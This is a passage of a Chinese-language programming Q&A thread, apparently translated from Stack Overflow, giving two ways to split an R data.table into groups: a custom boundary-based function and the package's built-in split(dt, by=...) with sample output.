有时拆分是您想要做的，而 data.table “按”方法并不方便。

实际上，您可以使用 data.table only 指令轻松地手动进行拆分，并且它的工作效率非常高：

```
SplitDataTable <- function(dt,attr) {
  boundaries=c(0,which(head(dt[[attr]],-1)!=tail(dt[[attr]],-1)),nrow(dt))
  return(
    mapply(
      function(start,end) {dt[start:end,]},
      head(boundaries,-1)+1,
      tail(boundaries,-1),
      SIMPLIFY=F))
} 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2019-08-30T13:13:24.770

如上所述（@jangorecki），包`data.table`已经有自己的拆分功能。在那个简化的情况下，我们可以使用：

```
> dt <- data.table(a = c(1, 2, 3, 3), b = c(1, 1, 2, 2))
> split(dt, by = "b")
$`1`
   a b
1: 1 1
2: 2 1

$`2`
   a b
1: 3 2
2: 3 2 
```

对于更困难/具体的情况，我建议使用**按引用**函数在 data.table 中创建一个新变量，`:=`或者`set`然后调用该函数`split`。如果您关心性能，请确保始终保留在 data.table 环境中，例如，`dt[, SplitCriteria := (...)]`而不是在外部计算拆分变量。